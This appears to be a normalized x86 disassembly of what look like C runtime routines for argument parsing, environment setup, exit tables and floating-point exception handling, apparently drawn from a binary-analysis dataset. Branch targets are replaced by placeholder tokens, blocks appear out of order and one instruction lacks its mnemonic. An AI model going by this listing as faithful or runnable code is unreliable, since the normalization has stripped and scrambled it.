je r-xdata
xor eax eax
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
lea eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x14 ]
call sub_4168f2
pop ecx
pop ecx
jmp r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
mov esp ebp
pop ebp
retn
sub_416b31
mov eax [ rw-data ]
push esi
push 0x3
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_41942e
push 0x0
mov [ rw-data ] eax
call sub_41a3a5
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov eax esi
mov [ rw-data ] eax
push edi
xor edi edi
mov esi rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_41942e
push 0x0
mov [ rw-data ] eax
call sub_41a3a5
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ esi + 0x10 ] 0xfffffffe
cmp eax 0xfffffffe
je r-xdata
or eax 0xffffffff
pop esi
retn
push 0x0
push 0xfa0
lea eax [ esi + 0x20 ]
push eax
call sub_41c164
mov eax [ rw-data ]
mov edx edi
sar edx 0x6
mov [ eax + edi * 4 ] esi
mov eax edi
and eax 0x3f
imul ecx eax 0x30
mov eax [ edx * 4 + rw-data ]
mov eax [ eax + ecx + 0x18 ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add esi 0x38
inc edi
cmp esi rw-data
jne r-xdata
sub_416c0b
push esi
call sub_416225
call sub_41da5b
xor esi esi
mov eax [ rw-data ]
push [ esi + eax ]
call sub_41d31e
mov eax [ rw-data ]
pop ecx
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
add esi 0x4
cmp esi 0xc
jne r-xdata
push [ rw-data ]
call sub_41a3a5
and [ rw-data ] 0x0
pop ecx
pop esi
retn
sub_416c55
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ ebp + 0xc ]
test edx edx
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
push 0x16
pop eax
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
lea eax [ ecx + 0x4 ]
mov [ edx ] eax
mov edx [ ebp + 0x14 ]
test edx edx
je r-xdata
mov [ eax ] ecx
xor eax eax
pop ebp
retn
lea eax [ ecx + 0x8 ]
mov [ edx ] eax
sub_416cc3
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi + 0xc ]
push edi
or edi 0xffffffff
shr eax 0xd
test al 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
or eax 0xffffffff
jmp r-xdata
push esi
call sub_41dd1f
pop ecx
mov eax edi
pop edi
push esi
call sub_416178
push esi
mov edi eax
call sub_41d31e
push esi
call sub_41b8cf
push eax
call sub_41dba5
add esp 0x10
test eax eax
jns r-xdata
pop esi
pop ebp
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
or edi 0xffffffff
jmp r-xdata
push [ esi + 0x1c ]
call sub_41a3a5
and [ esi + 0x1c ] 0x0
pop ecx
sub_416d39
push 0x10
push r--data
call sub_40e2a0
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x20 ] esi
xor eax eax
test esi esi
setne al
test eax eax
jne r-xdata
mov eax [ esi + 0xc ]
shr eax 0xc
push esi
test al 0x1
je r-xdata
call sub_41529e
mov [ eax ] 0x16
call sub_413b01
and [ ebp - 0x1c ] 0x0
call sub_416c9b
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_416cc3
pop ecx
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_416daf
mov eax esi
call sub_41dd1f
pop ecx
jmp r-xdata
call sub_40e2e6
retn
or eax 0xffffffff
jmp r-xdata
sub_416db9
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x10 ]
call sub_414048
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
xor eax eax
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x2 ] al
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call sub_416f03
pop ecx
pop ecx
test al al
je r-xdata
call sub_41529e
xor ecx ecx
mov [ eax ] 0x2a
xor eax eax
mov [ ebp - 0x4 ] bl
inc ecx
mov [ ebp - 0x3 ] al
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp - 0xc ] eax
push ecx
movzx eax al
push eax
call sub_41de1d
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x10 ] al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] al
xor eax eax
push 0x2
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] al
pop ecx
jmp r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
mov [ ebp - 0x8 ] ax
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_41e073
add esp 0x24
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
jmp r-xdata
sub_416f03
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_41606f
add esp 0xc
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_416f3a
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_416f20
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_416f7e
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_416fc2
mov esi eax
test esi esi
je r-xdata
xor eax eax
push [ ebp + 0x8 ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
sub_416fc2
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
push 0x0
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ rw-data ]
mov ecx esi
and ecx 0x1f
xor esi [ rw-data ]
ror esi cl
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41700b
mov eax esi
call sub_40e2e6
retn
sub_417014
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
call sub_41ab17
mov esi eax
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov ecx edx
push ebx
xor ebx ebx
push edi
lea eax [ edx + 0x90 ]
cmp edx eax
je r-xdata
mov ecx ebx
mov edi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
mov edi [ ecx + 0x8 ]
test edi edi
jne r-xdata
test ecx ecx
je r-xdata
add ecx 0xc
cmp ecx eax
jne r-xdata
pop edi
pop ebx
cmp edi 0x5
jne r-xdata
cmp [ ecx ] edi
je r-xdata
cmp edi 0x1
je r-xdata
xor eax eax
mov [ ecx + 0x8 ] ebx
inc eax
jmp r-xdata
or eax 0xffffffff
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x4 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
push [ ecx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx edi
call [ r--data ]
call edi
lea eax [ edx + 0x24 ]
lea edx [ eax + 0x6c ]
jmp r-xdata
cmp eax edx
jne r-xdata
mov [ eax + 0x8 ] ebx
add eax 0xc
mov ebx [ esi + 0x8 ]
mov eax 0xc0000091
cmp [ ecx ] eax
ja r-xdata
cmp [ ecx ] 0xc0000092
je r-xdata
je r-xdata
mov [ esi + 0x8 ] 0x8a
cmp [ ecx ] 0xc0000093
je r-xdata
mov [ esi + 0x8 ] 0x84
jmp r-xdata
cmp [ ecx ] 0xc000008d
je r-xdata
mov eax [ ebp - 0x8 ]
pop ecx
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc00002b4
je r-xdata
push [ esi + 0x8 ]
mov ecx edi
push 0x8
call [ r--data ]
call edi
pop ecx
mov [ esi + 0x8 ] ebx
jmp r-xdata
mov [ esi + 0x8 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc000008e
je r-xdata
mov [ esi + 0x8 ] 0x8e
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x8 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc000008f
je r-xdata
mov [ esi + 0x8 ] 0x8d
jmp r-xdata
mov [ esi + 0x8 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x8 ] 0x81
jmp r-xdata
sub_417187
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x2
push esi
je r-xdata
push ebx
push edi
push 0x104
mov esi rw-data
xor edi edi
push esi
push edi
call [ GetModuleFileNameW@IAT ]
mov ebx [ rw-data ]
mov [ rw-data ] esi
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x1
je r-xdata
mov ebx esi
cmp [ ebx ] di
jne r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x4 ]
lea eax [ esi + eax * 4 ]
push eax
push esi
push ebx
call sub_4172a6
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
call sub_41529e
push 0xc
pop edi
mov [ eax ] edi
jmp r-xdata
lea eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] edi
push eax
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] edi
push eax
push edi
push edi
push ebx
call sub_4172a6
push 0x2
push [ ebp - 0xc ]
push [ ebp - 0x4 ]
call sub_41742c
mov esi eax
add esp 0x20
test esi esi
jne r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push esi
call sub_41e5d8
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
dec eax
mov [ rw-data ] eax
mov eax esi
mov esi edi
mov [ rw-data ] eax
mov ebx edi
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx edi
mov eax edx
cmp [ edx ] edi
je r-xdata
mov eax [ ebp - 0x8 ]
jmp r-xdata
push esi
call sub_41a3a5
pop ecx
pop edi
mov eax ebx
pop ebx
mov eax edi
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] eax
mov ebx edi
mov [ rw-data ] edx
lea eax [ eax + 0x4 ]
inc ecx
cmp [ eax ] edi
jne r-xdata
push eax
call sub_41a3a5
pop ecx
mov [ ebp - 0x8 ] edi
sub_4172a6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
sub esp 0x10
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x18 ]
mov [ edi ] ebx
mov [ eax ] 0x1
test esi esi
je r-xdata
mov [ ebp - 0x8 ] 0x20
mov [ ebp - 0xc ] 0x9
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
inc [ edi ]
test edx edx
je r-xdata
test bl bl
sete bl
add ecx 0x2
jmp r-xdata
movzx eax [ ecx ]
add ecx 0x2
test ax ax
je r-xdata
mov ax [ ecx ]
mov [ edx ] ax
add edx 0x2
test bl bl
jne r-xdata
sub ecx 0x2
push 0x22
pop eax
cmp ax [ ebp - 0x8 ]
je r-xdata
test esi esi
je r-xdata
movzx eax [ ecx ]
cmp ax [ ebp - 0x8 ]
je r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0xc ]
push 0x22
pop eax
jne r-xdata
inc [ ebx ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ esi ] eax
add ecx 0x2
jmp r-xdata
cmp ax [ ebp - 0xc ]
jne r-xdata
mov ebx [ ebp + 0x14 ]
xor eax eax
mov [ ebp - 0x1 ] al
xor eax eax
mov [ edx - 0x2 ] ax
jmp r-xdata
cmp [ ecx ] ax
jne r-xdata
xor eax eax
cmp [ ecx ] ax
je r-xdata
test esi esi
je r-xdata
inc [ ebx ]
xor ebx ebx
push 0x5c
pop esi
mov [ esi ] edx
add esi 0x4
mov [ ebp + 0xc ] esi
cmp [ ecx ] si
je r-xdata
add ecx 0x2
inc eax
push 0x22
pop esi
cmp [ ecx ] si
push 0x5c
pop esi
jne r-xdata
test eax eax
jne r-xdata
test al 0x1
jne r-xdata
dec eax
test edx edx
je r-xdata
movzx eax [ ecx ]
test ax ax
je r-xdata
mov edi [ ebp + 0x18 ]
shr eax 0x1
jmp r-xdata
cmp [ ebp - 0x1 ] bl
je r-xdata
inc [ edi ]
mov [ edx ] si
add edx 0x2
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x14 ]
test edx edx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ ebp - 0x1 ] bl
mov [ ebp - 0x10 ] ebx
sete [ ebp - 0x1 ]
push 0x22
pop esi
cmp [ ecx + 0x2 ] si
push 0x5c
pop esi
jne r-xdata
inc [ edi ]
xor eax eax
jmp r-xdata
xor eax eax
mov [ edx ] ax
add edx 0x2
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp ax [ ebp - 0x8 ]
je r-xdata
add ecx 0x2
jmp r-xdata
cmp [ ecx ] ax
je r-xdata
add ecx 0x2
jmp r-xdata
test edx edx
je r-xdata
cmp ax [ ebp - 0xc ]
je r-xdata
mov [ ebp - 0x10 ] 0x1
mov eax ebx
jmp r-xdata
inc [ edi ]
mov [ edx ] ax
add edx 0x2
sub_41742c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0x3fffffff
jb r-xdata
push edi
or edi 0xffffffff
mov ecx [ ebp + 0xc ]
xor edx edx
mov eax edi
div [ ebp + 0x10 ]
cmp ecx eax
jae r-xdata
xor eax eax
jmp r-xdata
xor eax eax
jmp r-xdata
imul ecx [ ebp + 0x10 ]
shl esi 0x2
sub edi esi
cmp edi ecx
ja r-xdata
pop esi
pop ebp
retn
pop edi
lea eax [ ecx + esi ]
push 0x1
push eax
call sub_41942e
push 0x0
mov esi eax
call sub_41a3a5
add esp 0xc
mov eax esi
sub_41748c
mov eax [ rw-data ]
test eax eax
jne r-xdata
retn
cmp [ rw-data ] eax
jne r-xdata
call sub_4174bb
test eax eax
jne r-xdata
xor eax eax
retn
call sub_417638
neg eax
sbb eax eax
not eax
and eax [ rw-data ]
sub_4174bb
cmp [ rw-data ] 0x0
je r-xdata
push esi
push edi
call sub_41ee26
mov esi eax
test esi esi
jne r-xdata
xor eax eax
retn
push esi
call sub_41750f
pop ecx
test eax eax
jne r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_424e86
xor edi edi
or edi 0xffffffff
jmp r-xdata
push esi
call sub_41a3a5
pop ecx
mov eax edi
pop edi
pop esi
retn
push 0x0
call sub_41a3a5
pop ecx
sub_41750f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
mov [ ebp - 0x8 ] eax
mov edx eax
push esi
push edi
movzx eax [ ebx ]
mov esi ebx
test ax ax
je r-xdata
lea eax [ edx + 0x1 ]
push 0x4
push eax
call sub_41942e
mov edi eax
xor esi esi
pop ecx
pop ecx
test edi edi
je r-xdata
push 0x3d
pop ebx
mov edi esi
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov ecx esi
lea edi [ ecx + 0x2 ]
inc edx
cmp [ ebx ] si
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x8 ]
jne r-xdata
sub ecx edi
sar ecx 0x1
lea esi [ esi + ecx * 2 ]
add esi 0x2
movzx eax [ esi ]
test ax ax
jne r-xdata
mov ecx ebx
lea edx [ ecx + 0x2 ]
jmp r-xdata
cmp ax bx
je r-xdata
mov ebx [ ebp + 0x8 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
push 0x3d
lea eax [ ecx + 0x1 ]
pop ecx
mov [ ebp - 0x8 ] eax
cmp [ ebx ] cx
je r-xdata
push esi
call sub_41a3a5
pop ecx
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ebx [ ebx + eax * 2 ]
push 0x2
push eax
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push edi
call sub_417609
xor esi esi
push esi
call sub_41a3a5
pop ecx
pop ecx
push ebx
push [ ebp - 0x8 ]
push esi
call sub_41a3df
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
mov eax [ ebp - 0x4 ]
mov [ eax ] esi
xor esi esi
add eax 0x4
push esi
mov [ ebp - 0x4 ] eax
call sub_41a3a5
mov eax [ ebp - 0x8 ]
pop ecx
sub_417609
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov eax [ esi ]
push edi
mov edi esi
jmp r-xdata
test eax eax
jne r-xdata
push eax
call sub_41a3a5
lea edi [ edi + 0x4 ]
mov eax [ edi ]
pop ecx
push esi
call sub_41a3a5
pop ecx
pop edi
sub_417638
mov edi edi
push edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
push ebx
push esi
xor ebx ebx
jmp r-xdata
or eax 0xffffffff
pop edi
retn
cmp [ edi ] ebx
jne r-xdata
push ebx
push ebx
push 0xffffffff
push [ edi ]
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
or eax 0xffffffff
jmp r-xdata
push 0x2
push ebx
call sub_41942e
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
pop esi
pop ebx
pop edi
retn
push esi
call sub_41a3a5
pop ecx
push ebx
push esi
push 0xffffffff
push [ edi ]
xor ebx ebx
push ebx
push ebx
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push ebx
push esi
call sub_41f1c8
push ebx
call sub_41a3a5
add esp 0xc
add edi 0x4
sub_4176b1
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
mov esi ecx
push edi
lea edi [ esi + 0x4 ]
jmp r-xdata
cmp esi edi
jne r-xdata
mov ecx [ ebp + 0x8 ]
push esi
call [ r--data ]
call [ ebp + 0x8 ]
pop ecx
add esi 0x4
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn 0x4
sub_41772c
push sub_4176f1
mov ecx rw-data
call sub_4176b1
push sub_41770c
mov ecx rw-data
call sub_4176b1
push [ rw-data ]
call sub_417609
push [ rw-data ]
call sub_417609
pop ecx
pop ecx
retn
sub_41777c
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41798e
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4177c1
mov eax esi
call sub_40e2e6
retn 0xc
sub_4177cd
push 0xc
push r--data
call sub_40e2a0
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41786e
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_417812
mov eax esi
call sub_40e2e6
retn 0xc
sub_41781e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_4177cd
mov esp ebp
pop ebp
retn
sub_417846
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41777c
mov esp ebp
pop ebp
retn
sub_41786e
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax ecx
mov [ ebp - 0x18 ] eax
push ebx
mov eax [ eax ]
mov ebx [ eax ]
test ebx ebx
jne r-xdata
mov edx [ rw-data ]
push esi
push edi
mov edi [ ebx ]
mov esi edx
mov ebx [ ebx + 0x4 ]
and esi 0x1f
xor edi edx
mov [ ebp - 0x14 ] esi
mov ecx esi
xor ebx edx
ror edi cl
ror ebx cl
test edi edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
xor eax eax
pop esi
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ebx
cmp edi 0xffffffff
je r-xdata
cmp [ ebx ] eax
je r-xdata
mov eax edx
xor edx edx
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
ror edx cl
mov ecx [ ebp - 0x18 ]
xor edx [ rw-data ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax ] edx
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax + 0x4 ] edx
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax + 0x8 ] edx
push edi
call sub_41a3a5
mov edx [ rw-data ]
pop ecx
sub ebx 0x4
cmp ebx edi
jb r-xdata
mov esi [ ebx ]
mov ecx [ ebp - 0x14 ]
xor esi edx
ror esi cl
mov ecx esi
mov [ ebx ] eax
call [ r--data ]
call esi
mov eax [ ebp - 0x18 ]
mov edx [ rw-data ]
mov esi edx
and esi 0x1f
mov [ ebp - 0x14 ] esi
mov eax [ eax ]
mov eax [ eax ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor ecx edx
mov [ ebp - 0x8 ] ecx
xor eax edx
mov ecx esi
ror [ ebp - 0x8 ] cl
ror eax cl
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0xc ] ecx
mov edi ecx
mov [ ebp - 0x10 ] eax
mov ebx eax
jmp r-xdata
push 0x20
pop ecx
cmp eax [ ebp - 0x10 ]
je r-xdata
push 0x20
pop ecx
sub ecx esi
xor eax eax
ror eax cl
xor eax edx
mov ecx [ ebp - 0x8 ]
sub_41798e
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax ecx
mov [ ebp - 0x8 ] eax
push esi
mov eax [ eax ]
mov esi [ eax ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov ecx eax
push ebx
mov ebx [ esi ]
and ecx 0x1f
push edi
mov edi [ esi + 0x4 ]
xor ebx eax
mov esi [ esi + 0x8 ]
xor edi eax
xor esi eax
ror edi cl
ror esi cl
ror ebx cl
cmp edi esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push [ eax ]
call sub_417c8d
push ebx
mov [ edi ] eax
call sub_410c5a
mov ebx [ ebp - 0x8 ]
mov ecx [ ebx ]
mov ecx [ ecx ]
mov [ ecx ] eax
lea eax [ edi + 0x4 ]
push eax
call sub_410c5a
mov ecx [ ebx ]
push esi
mov ecx [ ecx ]
mov [ ecx + 0x4 ] eax
call sub_410c5a
mov ecx [ ebx ]
add esp 0x10
mov ecx [ ecx ]
mov [ ecx + 0x8 ] eax
xor eax eax
sub esi ebx
mov eax 0x200
sar esi 0x2
cmp esi eax
ja r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea edi [ eax + esi ]
test edi edi
jne r-xdata
mov eax esi
cmp edi esi
jb r-xdata
push 0x20
pop edi
push 0x4
lea edi [ esi + 0x4 ]
push edi
push ebx
call sub_41f1d3
push 0x0
mov [ ebp - 0x4 ] eax
call sub_41a3a5
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
push 0x4
push edi
push ebx
call sub_41f1d3
push 0x0
mov [ ebp - 0x4 ] eax
call sub_41a3a5
mov ecx [ ebp - 0x4 ]
add esp 0x10
test ecx ecx
jne r-xdata
lea eax [ ecx + esi * 4 ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea esi [ ecx + edi * 4 ]
mov eax [ rw-data ]
mov edi [ ebp - 0x4 ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
mov ecx edi
xor eax [ rw-data ]
mov [ ebp - 0xc ] eax
mov eax esi
sub eax edi
add eax 0x3
shr eax 0x2
cmp esi edi
sbb edx edx
not edx
and edx eax
mov [ ebp - 0x4 ] edx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov edx [ ebp - 0xc ]
xor eax eax
pop edi
pop ebx
inc eax
mov [ ecx ] edx
lea ecx [ ecx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
sub_417ae5
mov edi edi
push ebp
mov ebp esp
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push 0x2
call sub_41781e
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_417b02
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
mov eax [ esi ]
cmp eax [ esi + 0x8 ]
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
xor eax eax
ror eax cl
xor eax [ rw-data ]
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn
sub_417b3f
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x2
call sub_417846
pop ecx
pop ecx
mov esp ebp
pop ebp
retn
sub_417b97
mov eax [ rw-data ]
push esi
push 0x20
and eax 0x1f
xor esi esi
pop ecx
sub ecx eax
ror esi cl
xor esi [ rw-data ]
push esi
call sub_413a72
push esi
call sub_416f6a
push esi
call sub_41f439
push esi
call sub_417cc5
push esi
call sub_41518f
add esp 0x14
mov al 0x1
pop esi
retn
sub_417bdd
mov eax [ rw-data ]
or ecx 0xffffffff
push esi
[ eax ] ecx
jne r-xdata
push [ rw-data ]
call sub_41a3a5
push [ rw-data ]
xor esi esi
mov [ rw-data ] esi
call sub_41a3a5
